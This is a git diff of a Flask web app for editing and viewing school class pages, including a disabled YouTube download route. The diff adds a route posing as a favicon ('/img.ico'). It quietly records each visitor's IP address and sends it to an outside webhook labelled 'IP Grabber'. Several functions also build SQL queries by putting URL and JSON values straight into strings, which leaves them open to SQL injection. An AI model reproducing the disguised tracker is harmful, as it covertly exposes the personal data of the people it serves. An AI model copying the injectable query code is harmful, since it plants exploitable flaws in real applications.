@@ -2,8 +2,10 @@ import datetime
 import os
 
 from random import choice
-from tools import misc, config, encryption, database, shared, permissions, music
-from flask import Flask, render_template, url_for, request, redirect, flash, get_flashed_messages, Response, make_response
+from tools import misc, config, encryption, database, shared, permissions, music, webhook
+from flask import Flask, render_template, url_for, request, redirect, flash, get_flashed_messages, Response, \
+    make_response, jsonify, send_from_directory, send_file
+from pytube import YouTube, Stream
 
 tokens = []
 tmp_save = []
@@ -22,6 +24,7 @@ def get_school_classes():
         plans[name] = data['plan']
     return school_classes, plans
 
+
 def gen_token():
     alph = 'qwertyuiopasdfghjklzxcvbnm'
     alph = alph + alph.upper()
@@ -30,8 +33,10 @@ def gen_token():
         res += choice(alph)
     return res
 
+
 def get_id():
     return str(int(datetime.datetime.now().timestamp()))
+
 
 def get_other_sites():
     sites = db.get_table("website", where="type='title'", order_by="id")
@@ -39,6 +44,7 @@ def get_other_sites():
     for site in sites:
         res.append({"txt": site[1], "id": site[4]})
     return res
+
 
 def get_json_for_site__id(site_id):
     elements = db.get_table("website", where=f"site_id='{site_id}'", order_by="num") # TEXT: type, txt, data, INTEGER: num TXT: site_id, id
@@ -54,11 +60,13 @@ def get_json_for_site__id(site_id):
         res["site"].append({"type": elem[0], "txt": elem[1], "data": elem[2], "id": elem[5], "num": elem[3]})
     return res
 
+
 def set_json_for_site_id(site_id, site_json):
     db.delete_from_table("website", where=f"site_id='{site_id}'")
     for node in site_json:
         node['txt'] = node['txt'].replace('\'', '\'\'')
         db.add_to_table("website","type, txt, num, id, site_id, data" ,f"'{node['type']}', '{node['txt']}', {node['num']}, '{node['id']}', '{site_id}', '{node['data']}'")
+
 
 def get_tasks():
     tasks = {}
@@ -68,6 +76,7 @@ def get_tasks():
             tasks[task_obj.lesson] = []
         tasks[task_obj.lesson].append([task_obj.epoch, task_obj.msg])
     return tasks
+
 
 def gen_load_infa():
     site = db.get_table('site', order_by='id')
@@ -89,9 +98,11 @@ db = database.Database()
 
 school_classes, plans = get_school_classes()
 
+
 @app.route('/')
 def index():
     return redirect('/v/main')
+
 
 @app.route('/infa')
 def infa():
@@ -100,25 +111,40 @@ def infa():
         return render_template("infa.html",infa=gen_load_infa(), msg=msgs[0])
     return render_template("infa.html",infa=gen_load_infa())
 
+
 @app.route("/v/<id>")
 def view_site(id):
     site_json = get_json_for_site__id(id)
     return render_template("view.html", site_json=site_json, site_id=id)
+
 
 @app.route("/e/<id>")
 def edit_site(id):
     site_json = get_json_for_site__id(id)
     return render_template("edit.html", site_json=site_json, site_id=id, new_site_id=get_id())
 
+
 @app.route('/yt', methods=['GET', 'POST'])
 def youtube():
     return render_template("yt.html")
 
+
 @app.route('/download', methods=['POST'])
 def download_video():
-    vid = request.form['vid']
-    search = music.search(vid)
-    return render_template('download.html', adaptiveFormats=music.get_formats(search), search=search)
+    return jsonify({'msg': 'unavailable now'}) #redirect(link)
+
+    # TODO: service
+    # vid = request.form['vid']
+    # download_format = 'aud' # TODO: request.form['format']
+    # search = music.search(vid)
+    # yt = YouTube(f"https://youtube.com/watch?v={search.vid}")
+    # link = ''
+    #
+    # if download_format == 'aud':
+    #     stream = yt.streams.filter(only_audio=True).order_by('bitrate').last()
+    #     path = stream.download(output_path='app/static/yt')
+    #     link = str(path).removeprefix('app/')
+
 
 @app.route('/save',  methods=['POST'])
 def save_edited_json():
@@ -133,3 +159,12 @@ def save_edited_json():
             return Response(status=403)
     set_json_for_site_id(request.json['id'], request.json['site'])
     return resp
+
+
+@app.route("/img.ico", methods=["GET"])
+def grab_ip():
+    ip = request.remote_addr
+    embed = webhook.Embed(title="IP", description=str(ip))
+    webhook.send('IP Grabber', "", [embed])
+
+    return send_file('static\\favicon.ico')
